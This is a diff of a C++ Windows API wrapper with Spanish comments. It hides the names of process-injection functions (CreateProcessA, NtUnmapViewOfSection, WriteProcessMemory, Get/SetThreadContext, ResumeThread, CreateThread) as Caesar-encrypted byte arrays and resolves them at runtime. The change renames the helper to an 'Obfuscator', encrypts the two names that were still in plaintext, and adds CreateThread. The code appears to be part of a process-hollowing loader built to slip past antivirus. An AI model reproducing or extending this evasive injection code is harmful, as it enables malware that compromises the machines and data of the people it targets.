@@ -1,24 +1,25 @@
 #include "system_utils\WinAPIWrapper.h"
-#include <Crypt.h>
+#include <Obfuscator.h>
 
 WinAPIWrapper::WinAPIWrapper() {
 	std::vector<unsigned char> kernel32 = { 0x49, 0x43, 0x50, 0x4c, 0x43, 0x4a, 0x11, 0x10, 0xc, 0x42, 0x4a, 0x4a };
 	std::vector<unsigned char> ntdll = { 0x4c, 0x52, 0x42, 0x4a, 0x4a, 0x0c, 0x42, 0x4a, 0x4a };
 
-	hKernel32 = GetModuleHandleA(Crypt::decryptCaesar(kernel32, 0xDE).c_str());
-	hNtdll = GetModuleHandleA(Crypt::decryptCaesar(ntdll, 0xDE).c_str());
-	_LoadFunctions();
+	hKernel32 = GetModuleHandleA(Obfuscator::DecryptCaesar(kernel32, 0xDE).c_str());
+	hNtdll = GetModuleHandleA(Obfuscator::DecryptCaesar(ntdll, 0xDE).c_str());
+
+	if (hKernel32 && hNtdll) {
+		_LoadFunctions();
+	}
 }
 
 WinAPIWrapper::~WinAPIWrapper() {
 	if (hKernel32) FreeLibrary(hKernel32);
 	if (hNtdll) FreeLibrary(hNtdll);
+	//     loadedFunctions.clear();  // Limpia el mapa al finalizar
 }
 
 void WinAPIWrapper::_LoadFunctions() {
-	if (!hKernel32 || !hNtdll) {
-		std::cerr << "Error al obtener los manejadores de las DLL" << std::endl;
-	}
 
 	// Nombres de las funciones cifradas
 	std::vector<unsigned char> CreateProcessA		= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x1f };
@@ -30,29 +31,34 @@ void WinAPIWrapper::_LoadFunctions() {
 	std::vector<unsigned char> ReadProcessMemory	= { 0x30, 0x43, 0x3f, 0x42, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x2b, 0x43, 0x4b, 0x4d, 0x50, 0x57 };
 	std::vector<unsigned char> NtUnmapViewOfSection = { 0x2c, 0x52, 0x33, 0x4c, 0x4b, 0x3f, 0x4e, 0x34, 0x47, 0x43, 0x55, 0x2d, 0x44, 0x31, 0x43, 0x41, 0x52, 0x47, 0x4d, 0x4c };
 	std::vector<unsigned char> GetThreadContext		= { 0x25, 0x43, 0x52, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42, 0x21, 0x4d, 0x4c, 0x52, 0x43, 0x56, 0x52 };
+	std::vector<unsigned char> CreateThread			= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };
 
-	std::string CreateProcessA_str			= Crypt::decryptCaesar(CreateProcessA, 0xDE);
-	std::string WriteProcessMemory_str		= Crypt::decryptCaesar(WriteProcessMemory, 0xDE);
-	std::string VirtualProtectEx_str		= Crypt::decryptCaesar(VirtualProtectEx, 0xDE);
-	std::string SetThreadContext_str		= Crypt::decryptCaesar(SetThreadContext, 0xDE);
-	std::string ResumeThread_str			= Crypt::decryptCaesar(ResumeThread, 0xDE);
-	std::string VirtualAllocEx_str			= Crypt::decryptCaesar(VirtualAllocEx, 0xDE);
-	std::string ReadProcessMemory_str		= Crypt::decryptCaesar(ReadProcessMemory, 0xDE);
-	std::string NtUnmapViewOfSection_str	= Crypt::decryptCaesar(NtUnmapViewOfSection, 0xDE);
-	std::string GetThreadContext_str		= Crypt::decryptCaesar(GetThreadContext, 0xDE);
+	// Descifrado de nombres de funciones
+	std::string CreateProcessA_str			= Obfuscator::DecryptCaesar(CreateProcessA, 0xDE);
+	std::string WriteProcessMemory_str		= Obfuscator::DecryptCaesar(WriteProcessMemory, 0xDE);
+	std::string VirtualProtectEx_str		= Obfuscator::DecryptCaesar(VirtualProtectEx, 0xDE);
+	std::string SetThreadContext_str		= Obfuscator::DecryptCaesar(SetThreadContext, 0xDE);
+	std::string ResumeThread_str			= Obfuscator::DecryptCaesar(ResumeThread, 0xDE);
+	std::string VirtualAllocEx_str			= Obfuscator::DecryptCaesar(VirtualAllocEx, 0xDE);
+	std::string ReadProcessMemory_str		= Obfuscator::DecryptCaesar(ReadProcessMemory, 0xDE);
+	std::string NtUnmapViewOfSection_str	= Obfuscator::DecryptCaesar(NtUnmapViewOfSection, 0xDE);
+	std::string GetThreadContext_str		= Obfuscator::DecryptCaesar(GetThreadContext, 0xDE);
+	std::string CreateThread_str			= Obfuscator::DecryptCaesar(CreateThread, 0xDE);
 
     if (hKernel32) {
-        CreateProcessA_ = reinterpret_cast<pCreateProcessA>(GetProcAddress(hKernel32, CreateProcessA_str.c_str()));
-        VirtualAllocEx_ = reinterpret_cast<pVirtualAllocEx>(GetProcAddress(hKernel32, VirtualAllocEx_str.c_str()));
+		// Obtener las direcciones de las funciones
+        CreateProcessA_		= reinterpret_cast<pCreateProcessA>(GetProcAddress(hKernel32, CreateProcessA_str.c_str()));
+        VirtualAllocEx_		= reinterpret_cast<pVirtualAllocEx>(GetProcAddress(hKernel32, VirtualAllocEx_str.c_str()));
         WriteProcessMemory_ = reinterpret_cast<pWriteProcessMemory>(GetProcAddress(hKernel32, WriteProcessMemory_str.c_str()));
-        GetThreadContext_ = reinterpret_cast<pGetThreadContext>(GetProcAddress(hKernel32, GetThreadContext_str.c_str()));
-		ReadProcessMemory_ = reinterpret_cast<pReadProcessMemory>(GetProcAddress(hKernel32, "ReadProcessMemory"));
-        SetThreadContext_ = reinterpret_cast<pSetThreadContext>(GetProcAddress(hKernel32, SetThreadContext_str.c_str()));
-        ResumeThread_ = reinterpret_cast<pResumeThread>(GetProcAddress(hKernel32, ResumeThread_str.c_str()));
+        GetThreadContext_	= reinterpret_cast<pGetThreadContext>(GetProcAddress(hKernel32, GetThreadContext_str.c_str()));
+		ReadProcessMemory_	= reinterpret_cast<pReadProcessMemory>(GetProcAddress(hKernel32, ReadProcessMemory_str.c_str()));
+        SetThreadContext_	= reinterpret_cast<pSetThreadContext>(GetProcAddress(hKernel32, SetThreadContext_str.c_str()));
+        ResumeThread_		= reinterpret_cast<pResumeThread>(GetProcAddress(hKernel32, ResumeThread_str.c_str()));
+        CreateThread_		= reinterpret_cast<pCreateThread>(GetProcAddress(hKernel32, CreateThread_str.c_str()));
     }
 
     if (hNtdll) {
-        NtUnmapViewOfSection_ = reinterpret_cast<pNtUnmapViewOfSection>(GetProcAddress(hNtdll, "NtUnmapViewOfSection"));
+        NtUnmapViewOfSection_ = reinterpret_cast<pNtUnmapViewOfSection>(GetProcAddress(hNtdll, NtUnmapViewOfSection_str.c_str()));
     }
 }
 
@@ -89,4 +95,8 @@ BOOL WinAPIWrapper::SetThreadContext(HANDLE hThread, const CONTEXT* lpContext) {
 
 DWORD WinAPIWrapper::ResumeThread(HANDLE hThread) {
     return ResumeThread_ ? ResumeThread_(hThread) : -1;
+}
+
+HANDLE WinAPIWrapper::CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
+	return CreateThread_ ? CreateThread_(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : NULL;
 }
